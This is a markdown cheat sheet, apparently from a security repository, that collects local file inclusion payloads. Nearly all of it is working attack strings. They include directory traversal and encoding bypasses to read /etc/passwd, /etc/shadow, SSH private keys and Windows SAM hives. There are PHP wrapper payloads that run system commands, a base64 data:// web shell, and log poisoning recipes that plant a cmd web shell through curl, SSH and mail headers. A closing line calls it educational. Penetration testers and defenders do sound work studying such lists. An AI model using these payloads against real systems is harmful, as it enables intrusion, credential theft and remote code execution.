# 📂 LFI Payloads Collection

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 🐧 Linux Files

### Basic Traversal
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### URL Encoded
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Bypass Techniques
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Interesting Linux Files
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

## 🪟 Windows Files

### Basic Traversal
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Interesting Windows Files
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

## 🔄 Wrappers (PHP)

### php://filter (Read Source)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (RCE)
```
php://input
POST: <?php system('id'); ?>
```

### data:// Wrapper
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (RCE)
```
expect://id
expect://whoami
```

### zip:// Wrapper
```
zip://path/to/file.zip%23shell.php
```

### phar:// Wrapper
```
phar://uploads/shell.jpg/test.php
```

---

## 🔥 Log Poisoning (RCE)

### Apache Access Log
```bash
# 1. Inject PHP via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Include log file
?page=/var/log/apache2/access.log&cmd=id
```

### SSH Log
```bash
# 1. Inject via SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Include log
?page=/var/log/auth.log&cmd=id
```

### Mail Log
```bash
# 1. Send poisoned email
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Include log
?page=/var/log/mail.log&cmd=id
```

### Proc Environ
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

## 📊 Quick Reference

### Detection
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Filter Bypass
| Filter | Bypass |
|--------|--------|
| `../` blocked | `....//`, `..././` |
| `.php` required | `%00`, null byte |
| Whitelist | php:// wrappers |

### Common Parameters
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

## 📚 Resources

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 LFI Payload Arsenal</b><br>
  <i>For educational purposes only!</i>
</p>
